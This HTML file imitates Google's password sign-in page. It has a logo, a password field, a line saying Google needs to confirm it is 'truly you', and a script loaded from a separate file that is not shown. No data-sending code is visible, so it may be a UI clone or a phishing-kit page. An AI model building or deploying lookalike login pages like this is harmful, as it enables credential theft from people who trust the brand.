<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Password</title>
    <link rel="stylesheet" href="Google2.css">
</head>
<body>
    <div class="cp">
        <div class="cp1">
            <div class="inf">
                <img src="g1.jpg" alt="Google Logo">
                <p id="sign-in">Welcome</p>
                <p id="use-account" class="email-profile-pill"></p> 
            </div>
            
            <div class="inp">
                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="st">
                <p id="guest-mode">To help keep your account secure, Google needs to confirm it's truly you.</p>
            </div>
            
            <div class="bt">
                <a id="create" href="Google.html">Back</a>
                <button id="submit-btn">Next</button>
            </div>
        </div>

        <div class="cp2">
            <div class="sl">
                <select id="language">
                    <option value="en">English (United States)</option>
                </select>
            </div>
            <div class="ft">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
    <script src="Google2.js"></script>
</body>
</html>
